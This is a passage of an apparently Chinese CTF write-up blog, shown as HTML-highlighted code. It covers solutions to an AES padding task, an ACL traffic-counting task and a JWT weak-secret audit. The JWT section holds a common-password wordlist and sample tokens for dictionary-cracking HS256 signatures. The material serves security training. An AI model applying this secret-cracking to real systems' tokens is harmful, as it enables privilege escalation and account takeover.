class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密或去填充出错:&quot;</span>, e)<br><br></code></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;T1s_4ll_4b0ut_AES_custom_padding!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ACL-Allow-Count"><a href="#ACL-Allow-Count" class="headerlink" title="ACL_Allow_Count"></a>ACL_Allow_Count</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">ACL 规则匹配与允许条数统计<br><br>说明：给定 <span class="hljs-number">3</span> 条 ACL 规则与 <span class="hljs-number">2000</span> 条流量日志（rules.txt, traffic.txt）。<br><br>规则格式：<span class="hljs-variable">&lt;action&gt;</span> <span class="hljs-variable">&lt;proto&gt;</span> <span class="hljs-variable">&lt;src&gt;</span> <span class="hljs-variable">&lt;dst&gt;</span> <span class="hljs-variable">&lt;dport&gt;</span><br>action: allow/deny<br><span class="hljs-keyword">proto</span>: tcp/udp/<span class="hljs-literal">any</span><br>src/dst: IPv4 或 CIDR 或 <span class="hljs-literal">any</span><br>dport: 端口号或 <span class="hljs-literal">any</span><br>流量格式：<span class="hljs-variable">&lt;proto&gt;</span> <span class="hljs-variable">&lt;src&gt;</span> <span class="hljs-variable">&lt;dst&gt;</span> <span class="hljs-variable">&lt;dport&gt;</span><br>匹配原则：自上而下 first-match；若无匹配则默认 deny。<br><br>任务：统计被允许（allow）的流量条数并输出该数字，flag格式：flag&#123;allow流量条数&#125;<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_rules</span>(<span class="hljs-params">filename=<span class="hljs-string">&quot;rules.txt&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从文件中读取并解析ACL规则。</span><br><span class="hljs-string">    为了提高匹配效率，IP地址/CIDR会预处理成ip_network对象。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    rules = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                parts = line.strip().split()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) == <span class="hljs-number">5</span>:<br>                    action, proto, src, dst, dport = parts<br>                    <span class="hljs-comment"># 使用ipaddress模块处理源和目标地址</span><br>                    <span class="hljs-comment"># strict=False允许将单个IP地址（如1.1.1.1）视为/32的CIDR</span><br>                    src_net = ipaddress.ip_network(src, strict=<span class="hljs-literal">False</span>) <span class="hljs-keyword">if</span> src != <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;any&#x27;</span><br>                    dst_net = ipaddress.ip_network(dst, strict=<span class="hljs-literal">False</span>) <span class="hljs-keyword">if</span> dst != <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;any&#x27;</span><br>                    rules.append(&#123;<br>                        <span class="hljs-string">&#x27;action&#x27;</span>: action,<br>                        <span class="hljs-string">&#x27;proto&#x27;</span>: proto,<br>                        <span class="hljs-string">&#x27;src&#x27;</span>: src_net,<br>                        <span class="hljs-string">&#x27;dst&#x27;</span>: dst_net,<br>                        <span class="hljs-string">&#x27;dport&#x27;</span>: dport<br>                    &#125;)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 规则文件 &#x27;<span class="hljs-subst">&#123;filename&#125;</span>&#x27; 未找到。请确保文件存在于同一目录中。&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 规则文件 &#x27;<span class="hljs-subst">&#123;filename&#125;</span>&#x27; 中存在无效的IP地址或CIDR: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> rules<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_traffic</span>(<span class="hljs-params">rules, traffic_filename=<span class="hljs-string">&quot;traffic.txt&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    处理流量日志，根据ACL规则进行匹配并统计允许的流量数。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    allowed_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(traffic_filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                traffic_parts = line.strip().split()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(traffic_parts) != <span class="hljs-number">4</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>                t_proto, t_src, t_dst, t_dport = traffic_parts<br><br>                <span class="hljs-keyword">try</span>:<br>                    t_src_ip = ipaddress.ip_address(t_src)<br>                    t_dst_ip = ipaddress.ip_address(t_dst)<br>                <span class="hljs-keyword">except</span> ValueError:<br>                    <span class="hljs-comment"># 跳过格式不正确的流量日志行</span><br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-comment"># 默认动作为deny，此变量记录匹配到的最终动作</span><br>                final_action = <span class="hljs-string">&#x27;deny&#x27;</span><br><br>                <span class="hljs-comment"># 自上而下匹配规则（First-match）</span><br>                <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> rules:<br>                    <span class="hljs-comment"># 检查协议</span><br>                    proto_match = (rule[<span class="hljs-string">&#x27;proto&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> rule[<span class="hljs-string">&#x27;proto&#x27;</span>] == t_proto)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> proto_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># 检查源IP</span><br>                    src_match = (rule[<span class="hljs-string">&#x27;src&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> t_src_ip <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;src&#x27;</span>])<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> src_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># 检查目标IP</span><br>                    dst_match = (rule[<span class="hljs-string">&#x27;dst&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> t_dst_ip <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;dst&#x27;</span>])<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dst_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># 检查目标端口</span><br>                    dport_match = (rule[<span class="hljs-string">&#x27;dport&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> rule[<span class="hljs-string">&#x27;dport&#x27;</span>] == t_dport)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dport_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># 如果所有条件都匹配，则确定了动作，并停止继续匹配</span><br>                    final_action = rule[<span class="hljs-string">&#x27;action&#x27;</span>]<br>                    <span class="hljs-keyword">break</span><br><br>                <span class="hljs-comment"># 如果最终动作为allow，则计数器加一</span><br>                <span class="hljs-keyword">if</span> final_action == <span class="hljs-string">&#x27;allow&#x27;</span>:<br>                    allowed_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: 流量文件 &#x27;<span class="hljs-subst">&#123;traffic_filename&#125;</span>&#x27; 未找到。请确保文件存在于同一目录中。&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> allowed_count<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1. 解析规则</span><br>    acl_rules = parse_rules()<br><br>    <span class="hljs-comment"># 2. 处理流量并统计</span><br>    total_allowed = process_traffic(acl_rules)<br><br>    <span class="hljs-comment"># 3. 按要求格式输出结果</span><br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;total_allowed&#125;</span>&#125;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1729</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="JWT-Weak-Secret"><a href="#JWT-Weak-Secret" class="headerlink" title="JWT_Weak_Secret"></a>JWT_Weak_Secret</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">题目描述<br>本题目模拟真实场景中的JWT（JSON Web Token）安全审计任务，需要检测使用弱密钥签名的JWT令牌，并识别具有管理员权限的用户。<br><br>任务要求<br><span class="hljs-number">1</span>、签名验证：<br>对于HS256算法的JWT：使用字典中的密码逐一尝试验证签名<br>对于RS256算法的JWT：使用提供的公钥验证签名<br><br><span class="hljs-number">2</span>、权限检查：<br>检查JWT载荷中的管理员权限标识<br>管理员权限条件：admin=true 或 role ∈ &#123;admin, superuser&#125;<br><br><span class="hljs-number">3</span>、统计结果：<br>统计同时满足以下条件的JWT令牌数量：<br>签名验证通过<br>具有管理员权限<br>flag格式：flag&#123;<span class="hljs-selector-tag">a</span>:<span class="hljs-selector-tag">b</span>:c...&#125;,<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>,c是令牌序号，从小到大的顺序。<br><br>JWT载荷结构示例<br>&#123;<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1721995200</span>,           <span class="hljs-comment">// 签发时间</span><br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1722038400</span>,           <span class="hljs-comment">// 过期时间</span><br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,              <span class="hljs-comment">// 用户标识</span><br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;svc-auth&quot;</span>,           <span class="hljs-comment">// 签发者</span><br>  <span class="hljs-string">&quot;admin&quot;</span>: true,               <span class="hljs-comment">// 管理员标识（方式1）</span><br>  <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>              <span class="hljs-comment">// 角色标识（方式2）</span><br>&#125;<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># --- 文件内容硬编码 ---</span><br><br><span class="hljs-comment"># 从 wordlist.txt 提取的内容</span><br>WORDLIST_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">qwerty</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">dragon</span><br><span class="hljs-string">monkey</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">abc123</span><br><span class="hljs-string">trustno1</span><br><span class="hljs-string">iloveyou</span><br><span class="hljs-string">welcome1</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">password</span><br><span class="hljs-string">summer2025</span><br><span class="hljs-string">letmein</span><br><span class="hljs-string">123456</span><br><span class="hljs-string">football</span><br><span class="hljs-string">111111</span><br><span class="hljs-string">p@ssw0rd</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 从 tokens.txt 提取的内容</span><br>TOKENS_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3IiwiYWRtaW4iOnRydWV9.u1-WBFIqURvwbKeDRN9bskgxfyR6ABIIEyMoGjbDINviCZ9YH2INQwsyJriB9GKUXo3pPlq2vVZ90rWRVj7jOpyTsYAeu4RKxWkErTxxy2MuGKCfLegx5SXwAixPjDCfFv1GudHdQ5Mk9PZlHWLsoltqCJd7A-MfBhwkWAlFKbV9SZUBADMP8NfH-slxQKZYgOeM9zyQ0u2_v1r4gLS0YiMV8tMSputLcY_qg3ReU6Wj3q76FPW15fKkDXcrc91471nfmFmJUPaEkd9nefhyDG_9qam0zGX63y5Exb7B8TgGSTuQI_hVJKcE5FRpeiG99uUmUCfym6kAhqdSqNXa0Q</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJhbmFseXN0In0.c2k8N-bWdK5X1xVmZ1mTB5Ve3iR7JXKE2NuySCeb-XU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3Iiwicm9sZSI6ImFkbWluIn0.HKj-colBnAUpG09DHdJSKu62Q2Kg8lb1oFWEMGtqlC4</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.d3S9cKJTa3tio75VN_IbLZFYwc8W6UYQ6F_yifuNR-I</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhZG1pbiJ9.ZrLvxIYF0_Xa9vs-AYBwYaozbsneuTKajDgxIT5NvzU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJhbmFseXN0In0.lCftjyuIHTjGVdZAsXIuQpBkozR2nLRNYLEb5wFxlrw</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWd3Iiwicm9sZSI6InZpZXdlciJ9.qzoOCny9o-w3hnPM3jHuJhWF4I70cPxVQW6RWafGQNXHAEyYMDLFK768uLfYeR0jp5-VWmzBYE8uLENCwC3HNhiYLP4H16lLmetS0aW_e_JVnqwttXpiOg99Qc4-8DysyzCIbBmhnNjmSziRQK2-KsP_R4sEkApsTtpRSk9QnZaMob_F1IryUsYek8CIpIKwO3-a5cPFgzf1-sUXdL7cLdbVkFiT9aVAB-FREMbe0-e8lyFtarkAdN1LJ4DyZ9QncIy4IeZp_cPdwZeiSFMH8PTMi3GG8clICKYuiXBi5DvZAb28BQ-KYrsimKBI1m_OdUNsHzKwVrNMYuGzvWgSOQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ2aWV3ZXIifQ.eAMwwxOEiEDogCVqfy4VkOllvh_0WVXSrPfOrMOa1A9JvOS1haycYsPMaRVBTmVLjZIlkrF6NJRmUilKJRA3E8l5jHo4Dfak7NaXSZWIEcVzG7Hx2TVekHEHSZqSYtnl0imZuwC278Ru99cmQECgt6xVGlF-RHiX04_bspRY0ly1KfW996H7ojZu5krL5xMzvGY90tk9-QnelvfkODCyVjai7PGzDXoRLNAO6IzyGeljbLAy81uT-UVmGQD67i31xDBIZEBIZluewRvS9L1u5JDadXtbz-f5TMxy_lwChKhkoLlNLYUVCIP5lA6EJraglsXRBv3_v94-mSOcTsorhw</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.qHmA_LKw0b0jeBM7Y75I-PlR7mc0g77jzGvQDometR4</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1ndyIsInJvbGUiOiJ2aWV3ZXIifQ.u2dfnGqRntI_WqKOhMePHYi8mDrXjdJkg7aNYhpOk0vBqJDiX37D7IuciMj-dGu-r6S9bXTiQTpEQIki7-ASAWXp96MBiSPLqZbM0G1JW_QJNEPaUQVCeYnGktw2_2FjY3IJ51jo1niERPHgzItu6YTDzKV3vG8Am9IL9kj0ZcbDA91b6HYd4VSRiUBM5s0JeN7xLFJYJKO1WJ1WXE-eXN70e1ab6cOkRgEA1gmUSt_9tvDXr-ZZt0SNkGjtgUyp650zfU2bnCTAUB08w9xwQpSvEKhlMejwfD4zJ24nq4USfVBPTusjGqn3mYrT3-DU9VCCxE3NgyMvxrfOVjxUng</span><br><span class="hljs-string">eyJhbGciOiJIUzI1S2IsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ2aWV3ZXIifQ.CimzECi1hbWAGtt-Ps0VBZdT9f5G4mbYPn02L1UEqoM</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1hdXRoIiwicm9sZSI6InVzZXIifQ.vJK8sI5LCA_XNeV751gL1OfSDnfuDTevADDkF0g_fzI</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJ1c2VyIn0.GYuFUzyj34ovBxrrZ7sNtzNzpPUCn5wmxSHZ5xcvq94</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsInJvbGUiOiJzdXBlcnVzZXIifQ.nmGxwNXtIuLw--BDYi5J357VDzXvRykC8ueycOcWuQ1tIDdnzPNN9HjN0XN6bcBz3nhZM5WXLMPWIKoiW5wDr3k44XDLJv4g5bbLNtpiMrjSk4N-zAitteO-eBCOiV2ZCugXKNsBtMOJm7RWSK_UJ0jyGGXseUrhdHZTN7cwXeNILkB87NWv4JBgPBsv1kDot2M2vrC25PGCpHsMv5ia4N-AegJF7Xiv-mQwN0QnnxvUAsr9SI1Rf57RnMfVkwMt9CJ6eqnXN-FcVDIJzovhjqtolL3jgG9JPDwxMIW-U4sddxErkeaWgBprviiVKxno-RDRVuZqUiWFhEYgNGgqRw</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXV0aCIsImFkbWluIjp0cnVlfQ.ibbmszD3yQmuurT_yPrlRXL9OY0MXNw3u-gkWaqYJ8HsMAF2vekNq99gSP6gPA8JIi1sDY861CEb7cYu8lgk9VLSOOvVD14fcs-PC1ztQJqoi8DDYW59QZyDz6cHIC95khY3RgH2Q5p-AoCxveoE22-zX63O_f3KHWWHkD-lDhbnZuF8JIqtAoEJj8K8RVk3NqXc5QZOm-dXxCelaQrco_CU89KvU8S3XfYzwfaZV_FynXWsqQX6tvCUXMO30wwb5J7kmRmAy3GxjrNPbNI1KDTpAlK7TvqAqZsYzcp3XIj95QF_4pbnOfOInEQf8IZqAaf1ET5mWBT7QkNyXHkHFw</span><br><span 